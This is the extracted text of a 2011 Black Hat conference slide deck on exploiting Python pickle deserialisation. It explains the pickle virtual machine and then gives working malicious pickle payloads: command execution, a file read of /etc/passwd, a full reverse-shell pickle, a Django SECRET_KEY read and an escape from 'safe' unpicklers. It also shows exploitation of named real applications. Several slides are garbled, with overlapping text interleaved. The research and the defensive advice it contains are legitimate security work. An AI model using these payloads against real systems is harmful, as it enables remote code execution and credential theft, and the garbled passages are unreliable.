Marco Slaviero
Sour Pickles
A serialisedMAeRCxOpSLlAoVIEitRaO//tBiLoACnKHAgTuUSiAd+2e011 in one part

This talk
Deep dive into exploiting Pickle deserialisation vulnerabilities (with a slight
diversion in finding them)
(i.e. not Miller or Esser)
MARCO SLAVIERO//BLACKHAT USA+2011

Free map enclosed
· Pickle: who cares? · Pickle background and PVM ·Attack scenarios ·Shellcode and demos · converttopickle.py/Anapickle ·Bugs in the wild
MARCO SLAVIERO//BLACKHAT USA+2011

Introduction: The theory
http://docs.python.org/library/pickle.html
MARCO SLAVIERO//BLACKHAT USA+2011

Introduction: The practice
· Bug found in Jan 2011 by @dbph · Want rsa in python?
­ easy_install rsa
· This guy did  https://github.com/aktowns/rsatweets
­ Python module for send and receiving encrypted tweets. Relies on 'rsa' module
· Follow the call chain
readTweet(tag, author) rsa.decrypt(cipher) rsa.gluechops(chops) rsa.unpicklechops(string) pickle.load(zlib.decompress(base64.decod estring(string)))
· RCE via Twitter
MARCO SLAVIERO//BLACKHAT USA+2011

Goals
· Dig into Pickle exploitation · Explore the limits of what is possible · Build useful tools and shellcode · Find bugs
· The fundamental issue is not new · But no public exploitation guide exists · (And what's the world for, if we can't exploit
stuff?)
MARCO SLAVIERO//BLACKHAT USA+2011

Background: Serialisation
· Function X wants to send an object to Function Y
­ Separate processes ­ Separate machines
· Can
a) Build a custom marshalling protocol b) Implement a public marshalling protocol, such as
ASN.1 c) Rely on the underlying framework to convert the
object to and from a stream of bytes, in a consistent way
· Hint: c) is easiest to use
· Built-in on numerous languages
MARCO SLAVIERO//BLACKHAT USA+2011

MARCO SLAVIERO//BLACKHAT USA+2011

Python's Pickle
· Default method for serialisation
­ In all recent versions (2.3+ for our purposes)
· Tightly integrated · Opaque · Versioned
­ Used to be 7-bit, now supports 8-bit too ­ 6 Pickle versions as of Python 3.2 ­ Newer versions are backwards compatible ­ Old Python versions break on newer pickles
· Two essential calls
­ dumps() takes as input a Python object and returns a serialised string. dump() is equivalent and not mentioned again.
­ loads() takes as input a serialised string and returns a Python object. load() is equivalent and not mentioned again.
­ Pickle and cPickle
MARCO SLAVIERO//BLACKHAT USA+2011

Terminology
· Pickle  The module · pickle stream or pickle  sequence of
serialised bytes · Host pickle  benign pickle obtained by an
attacker, into which shellcode could be injected · Malpickle  pickle stream into which shellcode has been placed · Pickling/unpickling  verbs for serialisation, deserialisation · Entity  Datum stored in a serialised form in the pickle stream. Has a Python type.
MARCO SLAVIERO//BLACKHAT USA+2011

Skinning the Pickle
· Not just marshalling · Objects are key · Handles arbitrary objects without
implementing Serializable or knowing anything about them
­ If the object name can be resolved in the module path, it can be reconstructed
· loads() is the gateway
­ naked loads() calls are our "gets()"
MARCO SLAVIERO//BLACKHAT USA+2011

High level default pickle process
· Take instance of class Foo · Extract all attributes from the object
(__dict__) · Convert the list of attributes into name-value
pairs · Write the object's class name · Write the pairs
· Object is reduced according to defined steps
MARCO SLAVIERO//BLACKHAT USA+2011

High level default unpickle process
· Take pickle stream · Rebuild list of attributes · Create an object from the saved class name · Copy attributes into the new object
· i.e. Can unpickle any object so long as the class can be instantiated
· Expressive language required to rebuild arbitrary attributes
MARCO SLAVIERO//BLACKHAT USA+2011

Lifting the Skirt
· How does that unpickle magic happen?
­ Kicks off in pickle.loads()
· Pickle relies on a tiny virtual machine · Pickle streams are actually programs
­ Instructions and data are interleaved
MARCO SLAVIERO//BLACKHAT USA+2011

Pickle Virtual Machine (PVM)
The protocol requires: 1.Instruction processor (or engine) 2.Stack 3.Memo
MARCO SLAVIERO//BLACKHAT USA+2011

PVM Instruction Engine
· Reads opcodes and arguments from the stream, starting at byte 0
· Processes them, alters the stack/ memo
· Repeat until end of stream · Return top of the stack, as the
deserialised object (when a STOP is encountered)
MARCO SLAVIERO//BLACKHAT USA+2011

PVM Memo
· Basically indexed registers · Implemented as a Python dict in Pickle · Provides storage for the lifetime of the
PVM
Push a string
S'first striSnagve'into memo p199
· Sparse array, can index non-sequentially
MARCO SLAVIERO//BLACKHAT USA+2011

PVM Stack
· Temporary storage for data, arguments, and objects used by the PVM
· Implemented as a Python list in Pickle · Regular stack
­ Instructions load data onto the stack ­ Instructions remove and process stack items
· Final object on the stack is the deserialised object
MARCO SLAVIERO//BLACKHAT USA+2011

PVM Instructions
· Opcodes are a single byte · Instructions that take arguments use
newlines to delimit them
­ Not all opcode have args ­ Some opcodes have multiple args
· Data loading instructions read from the instruction stream, load onto the stack
· No instructions to write into the instruction sequence
MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: data loading

Opcode
S V I

Mnemonic
STRING UNICODE INTEGER

Data type loaded onto the stack String Unicode Integer

Example
S'foo'\n Vfo\u006f\n I42\n

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Stack/memo manipulation

Opcode ( 0 p<memo>\n
g<memo>\n

Mnemonic MARK POP PUT
GET

Description
Pushes a marker onto the stack
Pops topmost stack item and discards
Copies topmost stack item to memo slot
Copies from memo slot onto stack

Example ( 0 p101\n
g101\n

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: List, dict, tuple manipulation

Opcode Mnemonic Description

l

LIST

Pops all stack items from topmost to the

first MARK, pushes a list with those items

back onto the stack

t

TUPLE

Pops all stack items from topmost to the

first MARK, pushes a tuple with those

items back onto the stack

d

DICT

Pops all stack items from topmost to the

first MARK, pushes a dict with those items

alternating as keys and values back onto

the stack

s

SETITEM Pops three values from the stack, a dict, a

key and a value. The key/value entry is

added to the dict, which is pushed back

onto the stack

Example (S'string'\nl
(S'string 1'\nS'string 2'\nt (S'key1'\nS'va l1'\nS'key2'\n I123\nd
(S'key1'\nS'va l1'\nS'key2'\n I123\ndS'key3' \nS'val 3'\ns

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example tuple

Instruction sequence
(S'str1' S'str2' I1234 t

Stack
<Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example tuple

Instruction sequence
(S'str1' S'str2' I1234 t

Stack
MARK <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example tuple

Instruction sequence
(S'str1' S'str2' I1234 t

Stack
'str1' MARK <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example tuple

Instruction sequence
(S'str1' S'str2' I1234 t

Stack
'str2' 'str1' MARK <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example tuple

Instruction sequence
(S'str1' S'str2' I1234 t

Stack
1234 'str2' 'str1' MARK <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example tuple

Instruction sequence Stack

(S'str1' S'str2' I1234 t

('str1','str2',1234,) <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Object loading

Opcode c

Mnemonic GLOBAL

Description
Takes two string arguments (module, class) to resolve a class name, which is called and placed on the stack.

Example cos\nsystem\n

Can load module.name.has.numerous.labels-style class names. Similar to 'i', which is ignored here

R

REDUCE Pops a tuple of arguments and a callable cos\nsystem

(perhaps loaded by GLOBAL), applies the \n(S'sleep 10'\ntR

callable to the arguments and pushes the

result

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example load and call

Instruction sequence
c__builtin__ file (S'/etc/passwd' tR

Stack
<Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example load and call

Instruction sequence
c__builtin__ file (S'/etc/passwd' tR

Stack
__builtin__.file <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example load and call

Instruction sequence
c__builtin__ file (S'/etc/passwd' tR

Stack
MARK __builtin__.file <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example load and call

Instruction sequence
c__builtin__ file (S'/etc/passwd' tR

Stack
'/etc/passwd' MARK __builtin__.file <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example load and call

Instruction sequence
c__builtin__ file (S'/etc/passwd' tR

Stack
('/etc/passwd',) __builtin__.file <Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Opcodes: Example load and call

Instruction sequence

Stack

c__builtin__ file (S'/etc/passwd' tR
'R' executes __builtin__.file('/etc/passwd')

<open file '/etc/ passwd', mode 'r' at 0x100525030>
<Stack bottom>

MARCO SLAVIERO//BLACKHAT USA+2011

Limitations
· Can't Pickle
­ Objects where it doesn't make sense (e.g. open files, network sockets)
· Opcodes
­ Set is not Turing complete in isolation ­ No comparison/branching ­ No repetition ­ Can't directly manipulate its own stream ­ Can't access Python variables
· No exception handling or error checking · Class instances and methods not directly handled · Limited to data manipulation and method execution
­ In practice, does this matter?
MARCO SLAVIERO//BLACKHAT USA+2011

Problem?
· Combination of GLOBAL and REDUCE means execution of Python callables
­ i.e. bad
· Unvalidated or poorly validated input to loads() is very dangerous
­ also known
· Previous work has focused on execution
­ no return values ­ no merging into malpickles
MARCO SLAVIERO//BLACKHAT USA+2011

Immediate aims
· Create reliable shellcode that works across Python versions/platforms
­ Even when "hamful" methods are unavailable
· Want shellcode that can modify the returned Python object
MARCO SLAVIERO//BLACKHAT USA+2011

Pickle usage, calling dumps(), loads(), dis()
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

Attack Scenarios (or getting hold of pickle streams)
MARCO SLAVIERO//BLACKHAT USA+2011

Successful approaches
MARCO SLAVIERO//BLACKHAT USA+2011

Attack Examples
· App stores pickles on disk with permissive file ACLs
· Web application encodes cookie data in a pickle
· Thick application uses pickle as RPC mechanism
MARCO SLAVIERO//BLACKHAT USA+2011

Truncation? Alteration?
·Truncate and overwrite the stream
·Prepend the stream ·Append to the stream ·Inject into the stream
MARCO SLAVIERO//BLACKHAT USA+2011

Normal stream
MARCO SLAVIERO//BLACKHAT USA+2011

Truncation
MARCO SLAVIERO//BLACKHAT USA+2011

Appending
MARCO SLAVIERO//BLACKHAT USA+2011

Prepending
MARCO SLAVIERO//BLACKHAT USA+2011

Inserting
MARCO SLAVIERO//BLACKHAT USA+2011

Verdict: Either prepend or overwrite an entity and match types
MARCO SLAVIERO//BLACKHAT USA+2011

Shellcode Writing
· Handcrafted1
cos
No output! systcoesm
S'lss(Sys'p­trei'nmtf -v a \'%d\' "\'`uname -a | sed \'s/.\\{2\\}\\(.\\).*/\\1/\'`";exit $a;' tR. tR.
· Generated2 (limited)
class RunBinSh(object): def __reduce__(self): return (subprocess.Popen, (('/bin/sh',),))
1http://nadiana.com/python-pickle-insecure 2http://blog.nelhage.com/2011/03/exploiting-pickle/
MARCO SLAVIERO//BLACKHAT USA+2011

Principles
· Stick to version 0, pickle module · Attacker controls the entire pickle stream · Modified based on entity types · Primarily interested in Python callables · Base pattern:
c<module> <callable> (<args> tR
MARCO SLAVIERO//BLACKHAT USA+2011

7 (achievable) guidelines for shellcode
1. Prepended streams must keep the stack empty 2. Inserted streams keep stack clean and use the
memo for storage
­ Store in memo to avoid function composition f(g(),g(h()))
3. Don't change entity types 4. Replacement entities to match original entities 5. Only callables in the top-level of modules are
candidates for GLOBAL 6. Aim for deterministic / reliable shellcode 7. So long as the type of class instances is
predictable, it's possible to invoke named methods.
MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances
· No opcode to call methods on class instances. i.e. Can't do this
f=os.popen('/path/to/massive/ sikrit')
f.read()
· Operations available
­ Load any top-level object ­ Execute callable objects ­ Craft Python data structures ­ Have stack/registers, will travel
MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances

· GLOBAL only loads top-level module objects

· REDUCE will execute off the stack when a

callable and an argument tuple are

present

This is easy, opcodes

The tricsku.pHpoowrt tthoislotaridviaally

handle to a class instance

('/etc/passwd',)

method?

<callable>

<Stack bottom>

· Look to Python introspection

MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances
f=open('/path/to/massive/sikrit') f.read()
MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances

f=open('/path/to/massive/sikrit') f.read()
Step 1 is easy:

c__builtin__

open

(S'/path/to/massive/sikrit'

tRp100

(Open file handle now at m[100])

MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances
f=open('/path/to/massive/sikrit') f.read()
· apply() invokes a method handle on an argument list
__builtin__.apply(file.read, [f])
· But we still need a handle to file.read · getattr() returns the attribute for a supplied name
__builtin__.getattr(file,'read')
· Combined __builtin__.apply( __builtin__.getattr(fi
le,'read'), [f])
MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances

f=open('/path/to/massive/sikrit') f.read()

· Step 2: c__builtin__ apply (c__builtin__ getattr (c__builtin__ file S'read' tR(g100 ltR

Violates guideline for avoiding composition
Quite unreadable

MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances

More general template. Calls methnm() on an instance of so.me.cls. Uses memo slots i and j for intermediate storage.

c__builtin__ getattr (cso.me cls S'methnm' tRpj 0c__builtin__ apply (gj gi ltR

MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing class instances

c__builtin__

I1000

open (S'/etc/passwd'

Open file, save cllatsRspin1s0ta2nce at m[100], cl0eacr_s_tabcukiltin__

tRp100

getattr

0c__builtin__

(c__builtin__

getattr

file

(fci_l_eNbosuwaivcleatdlliifninles_t.ac_lnocsee;()n.oNcootemipt oGusseiettioshnathnedle

to filSe'.recaldo,sseav'e m[1t01R]p103

at

S'read'

required

0c__builtin__

tRp101

apply

0c__builtin__

(g103

apply

(g100

(g101

ltRp104

(g100

0g102
Call apply(<handle>,<instance>)

MARCO SLAVIERO//BLACKHAT USA+2011

Building blocks: Accessing module constants

Load reference to __dict__
Obtain reference to module.__dict__.__getitem__
Call module.__dict__.__getitem__(const
ant)

cmodule __dict__ pi 0 c__builtin__ getattr (gi S('__getitem__' tRpj 0gj (S'constant' tRpsaved 0

MARCO SLAVIERO//BLACKHAT USA+2011

Shellcode considerations
· Wrapped or direct exploits
­ Unique shellcode per task? ­ Parameterise the shellcode using a more accessible
language
· Back channels
­ Assume fields from the unpickled object are displayed ­ Not a requirement (think findsock)
· Length
­ Bound by Python's internal string and list types
· Runtime
­ Is persistent shellcode possible?
· Automation
­ Nothing special about the conversion, so automate it
MARCO SLAVIERO//BLACKHAT USA+2011

Tool 1: converttopickle.py

f = __builtin__.open('foo','w',) r = f.write('line1\\nline2',) [__builtin__.file] q = __builtin__.str('Finished',) q

c__builtin__ open (S'foo' S'w' tRp100 0c__builtin__ getattr (c__builtin__ file S'write' tRp101 0c__builtin__

apply (g101 (g100 S'line1\nline2' ltRp102 0c__builtin__ str (S'Finished' tRp103 0g103

MARCO SLAVIERO//BLACKHAT USA+2011

converttopickle.py · Input is a sequence of Python-
like statements (mostly calls) · Statements are annotated to
indicate type · Output is standalone or
snippets of equivalent Pickle
MARCO SLAVIERO//BLACKHAT USA+2011

Now no need to care about opcodes
MARCO SLAVIERO//BLACKHAT USA+2011

Shellcode Library

· Info
­ Get globals/locals list ­ Fingerprint the Python
runtime (paths, versions, argv, loaded modules)
· Process handling
­ Return status of os.system()
­ Output of os.popen() ­ Output of
subprocess.check_output() ­ Bindshell ­ Reverse shell

· Files operations
· Runtime
­ Run eval() with supplied code ­ Inject Python debugger
(settrace())
· Frameworks
­ Django retrieval of configuration items (incl SECRET_KEY, DATABASES)
­ AppEngine retrieval of userids, Kinds (and their Properties)
­ AppEnginge call output functions directly

MARCO SLAVIERO//BLACKHAT USA+2011

Shellcode Library

· Info
­ Get globals/locals list ­ Fingerprint the Python
runtime (paths, versions, argv, loaded modules)
· Process handling
­ Return status of os.system()
­ Output of os.popen() ­ Output of
subprocess.check_output() ­ Bindshell ­ Reverse shell

· Files operations
· Runtime
­ Run eval() with supplied code
­ Inject Python debugger (settrace())
· Frameworks
­ Django retrieval of configuration items (incl SECRET_KEY, DATABASES)
­ AppEngine retrieval of userids, Kinds (and their Properties)
­ AppEnginge call output functions directly

MARCO SLAVIERO//BLACKHAT USA+2011

Reverseshell: Input
afinet = socket.AF_INET {const} sstream = socket.SOCK_STREAM {const} ttcp = socket.IPPROTO_TCP {const}
solsocket = socket.SOL_SOCKET {const} reuseaddr = socket.SO_REUSEADDR {const} sock = socket.socket(afinet,sstream,ttcp,)
q = sock.setsockopt(solsocket,reuseaddr,1) [socket.socket] conn = sock.connect(('localhost',55555,),) [socket.socket]
fileno = sock.fileno() [socket._socketobject]
fd = __builtin__.int(fileno,) subproc = subprocess.Popen(('/bin/bash',),0,'/bin/bash',
fd, fd, fd,)
MARCO SLAVIERO//BLACKHAT USA+2011

Reverseshell: Output
"csocket\n__dict__\np101\n0c__builtin__\ngetattr \n(g101\nS'__getitem__'\ntRp102\n0g102\n(S'AF_INET'\ntRp100\n0csock et\n__dict__\np104\n0c__builtin__\ngetattr \n(g104\nS'__getitem__'\ntRp105\n0g105\n(S'SOCK_STREAM'\ntRp103\n0c socket\n__dict__\np107\n0c__builtin__\ngetattr \n(g107\nS'__getitem__'\ntRp108\n0g108\n(S'IPPROTO_TCP'\ntRp106\n0c socket\n__dict__\np110\n0c__builtin__\ngetattr \n(g110\nS'__getitem__'\ntRp111\n0g111\n(S'SOL_SOCKET'\ntRp109\n0cs ocket\n__dict__\np113\n0c__builtin__\ngetattr \n(g113\nS'__getitem__'\ntRp114\n0g114\n(S'SO_REUSEADDR'\ntRp112\n0 csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr \n(csocket\nsocket\nS'setsockopt'\ntRp116\n0c__builtin__\napply \n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr \n(csocket\nsocket\nS'connect'\ntRp118\n0c__builtin__\napply \n(g118\n(g115\n(S'localhost'\nI55555\ntltRp119\n0c__builtin__ \ngetattr\n(csocket\n_socketobject \nS'fileno'\ntRp120\n0c__builtin__\napply \n(g120\n(g115\nltRp121\n0c__builtin__\nint \n(g121\ntRp122\n0csubprocess\nPopen\n((S'/bin/bash'\ntI0\nS'/bin/ bash'\ng122\ng122\ng122\ntRp123\n0S'finished'\n."
MARCO SLAVIERO//BLACKHAT USA+2011

Eval: Input
g = __builtin__.globals()
f =os_._sbyusitleimtmi(pn"_so_lr.etceopomspile('import os; r =0"_)_;bpuiiclkotlsie.nss_m_ay.ssehtveeadl=m("ff(,o"gos,"l);e'e,'p',1'0ex"e)c',) e = g.get(p'ipcikclkelessmmaashsehd'e,d)=["_f_oboui"ltin__.dict]
e
· eval()'ed code writes into the global var "picklesmashed"
· Shellcode returns this value of "picklesmashed"
· Can thus retrieve output from the eval()
MARCO SLAVIERO//BLACKHAT USA+2011

eval() shellcode
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

settrace shellcode: Input

g = __builtin__.globals()
f = __buidletfitn(_fr_a.mcoem,peivlee(n't,daerfg)t:(frame,event,arg):\\n\\tif efvreanmte=.=f"_claolcla"lif:s\.e\ivnte\en\mtts=\(=\)t\"ct\arny\ll:\":\t\\n\\t\etx\c\etp\t\Etxpcreipnttion:\\n\\t\ \t\\tprint "e"','',t'reyx:ec',)

r e

= =

g_._bgueitl(t'it'n,_)_.[e_v_ablu(ifl,tg,i)n__p.rdinitctfr]ame.f_locals.items()

x = sys.settrace(e,) except Exception:

"finished"

print "e"

· Python code block that defines a method is compiled and saved

· eval() is called to create the new method

· new method is passed to settrace()

MARCO SLAVIERO//BLACKHAT USA+2011

settrace() shellcode
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

Django config read: Input
a = django.core.mail.send_mail('Subject here', 'Here is the message.', 'foo@example.com', ['marco@sensepost.com'])
b = django.conf.settings g = __builtin__.getattr(b,'SECRET_KEY') g
· Execute Django mail sending · Retrieve Django configuration
MARCO SLAVIERO//BLACKHAT USA+2011

Django shellcode
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

AppEngine: Input
g = __builtin__.globals() f = __builtin__.compile('import google.appengine.ext.db\nfrom
impggooorootggllgeeo..aaoppgppeelenngg.iiannpeep..eeexxntt..gddibbn..emGeq.tleaQxduaet.trdayb(i"mSpEoLrEtCT*_\n_pkiecyk_l_esfmraosmhed=""\nq = from_\_n"pgro\o%poeg(rgtleoyo_.ag_l"pe)p.\naefpnopregnipgnieinne..eqex.xtft.e.dtdbcbh..(mm1e0te0at)da:a\tdnaa.Ptaroippmiecrpktlyoe.rsktmeay*s_hteod_+k=i"n%ds(:p)%,s\ pickg\loneo'sg,l'me'.,aa'spepxheeencg'd,i=)ne"."ext.db.metadata.Property.key_to_property(p)) qr == g__obouiglltei.na_p_.peevanlg(fin,ge,.)ext.db.GqlQuery("SELECT __key__ \
e = g.get('picklesmashed',) [__builtin__.dict]
e from __property__") for p in q.fetch(100): · pRicekulesesms tahsehedva+l=()"%shse:%llcso\dne" \%(google.appengine.ex \ · Pytht.odnb.pmaeyltoaaddatiam.Pprleompeerntyt.skeitey_ratoti_oknind(p), google.appe \ · Usinnggitnheis.etextc.hdnbi.qmueet,acdoautald.Perxotpraecrttyt.hkeeyd_atota_sptroorpeerty(p))
MARCO SLAVIERO//BLACKHAT USA+2011

AppEngine shellcode
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

Tool 2: Anapickle
· Pickle multitool
­ Simulates pickles (safely) ­ Extracts embedded callable names ­ Extracts entities and their types ­ Summarises the pickle ­ Generates shellcode according to provided
parameters
· Library is parameterised e.g. port number, host names, Python for eval() etc
· Applies wrapper functions
­ Inserts shellcode smartly
· Performs type checking on the shellcode and the entity it is replacing
MARCO SLAVIERO//BLACKHAT USA+2011

Anapickle
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

Application survey

· Looked on Google Code, Nullege, Sourceforge, Google, Pastebin

· Approaches

­ Strings with strong likelihood of being bad

"pickle.loads(packet" "pickle.loads(msg" "pickle.loads(data" "pickle.loads(message" "pickle.loads(buffer" "pickle.loads(req"

"pickle.loads(recv" "pickle.loads(net" "pickle.loads(.*decompres s" "pickle.loads(.*decode" "pickle.loads(.*url"

­ More general loads() review

MARCO SLAVIERO//BLACKHAT USA+2011

Results: so much for the warnings
· Examples for naked loads() found in web apps, thick apps, security apps, modules
· Not endemic, but not hard to find
­ Network-based
· Evil party · MitM
­ File-based ­ Cache-based
MARCO SLAVIERO//BLACKHAT USA+2011

Example 1
MARCO SLAVIERO//BLACKHAT USA+2011

Example 2: PyTables
"PyTables is a package for managing hierarchical datasets and designed to efficiently and easily cope with extremely large amounts of data" ­ pytables.org
import tables f = tables.openFile( 'somefile', 'w' ) node = f.createTable( f.root, 'sometable', { 'col':
tables.StringCol(10) }, title = "cos\npopen\n(S'sleep 10'\ntRp100\n0c__builtin__\ngetattr\n(c__builtin__\nfile \nS'read'\ntRp101\n0c__builtin__\napply \n(g101\n(g100\nI1000\nltRp102\n0c__builtin__\ngetattr \n(c__builtin__\nfile\nS'close'\ntRp103\n0c__builtin__ \napply\n(g103\n(g100\nltRp104\n0g102\n." )
I.e. if users control table titles, they get RCE
MARCO SLAVIERO//BLACKHAT USA+2011

Example 3: Peach fuzzer
· Peach fuzzer supports agent-based fuzzing
· Agent and controller communicate over the network
· Unauthenticated (well, by the time auth happens it's too late)
· Using pickle
MARCO SLAVIERO//BLACKHAT USA+2011

Peach fuzzer
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

Example 4: Tribler
· First torrent-based p2p streaming media finder / player / community thing
· Research project from Delft University of Technology and Vrije Universiteit Amsterdam (10 PhDs, 2 postdoc, significant cash)
· Research platform supports stats gathering · Pickle used to transport data · Clients only accept Pickles from verified
researchers · Researchers accept Pickles from any client · Two attacks
­ Researchers own clients ­ Clients own researchers
MARCO SLAVIERO//BLACKHAT USA+2011

Example 5: system-firewall-config
· RedHat Enterprise Linux and Fedora ship a GUI firewall config tool
· Be default, only available to admins · However, permission can be delegated via PolKit for certain
users to only configure the firewall
­ Required action for sharing printers
· I.e. in a large-scale RHEL/Fedora deployment, not unlikely · GUI runs as the logged in user · Backend runs as 'root' · Each talks via dbus to the other, passing pickles in the
process
­ I.e. low-priv client sends code that is executed by 'root'
· SELinux saves you (except from DoS) · CVE-2011-2520
MARCO SLAVIERO//BLACKHAT USA+2011

system-config-firewall
DEMO
MARCO SLAVIERO//BLACKHAT USA+2011

Protections
· When Pickle is a transport
­ Don't use if parties are unequally trusted ­ Don't allow the possibility of alteration in transit
(use SSL or sign pickles)
· When Pickle is a storage
­ Review filesystem permissions ­ Prevent TOCTOUs
· Review requirement for Pickle
­ JSON is a drop in replacement for data transport
· pickle.dumps -> json.dumps · pickle.loads -> json.loads
MARCO SLAVIERO//BLACKHAT USA+2011

"Safe" Unpicklers
· Occasional reference to safe unpicklers
­ They override the class loader, implementing either whitelists or blacklists
· Hard to get right · Here's an escape using four builtins (globals,
getattr, dict, apply)
c__builtin__globals(tRp100\n0c__builtin__ \ngetattr\n(c__builtin__\ndict\nS'g et'\ntRp101\n0c__builtin__\napply \n(g101\n(g100\nS'loads'\nltRp102\n(S'cos\\ nsystem\\n(S\\'sleep 10\\'\\ntR.'tR
· Lesson: don't try sanitise pickle. Trust or reject
MARCO SLAVIERO//BLACKHAT USA+2011

Future considerations
· Extend Anapickle to later versions · Embed Python bytecode in
Pickles · Look for pickle stream injection in
dumps() · Explore output handling
MARCO SLAVIERO//BLACKHAT USA+2011

Summary
· Pickles have a known vulnerability
­ No public exploitation guides
· Covered the PVM · Attack scenarios · Shellcode guidelines · Released a shellcode library · Converttopickle.py a tool for writing shellcode · Anapickle, a tool for manipulating pickles · Application survey find bugs in the wild
MARCO SLAVIERO//BLACKHAT USA+2011

Also, please fill in the feedback forms
Questions? MARCO SLAVIERO//BLACKHAT USA+2011

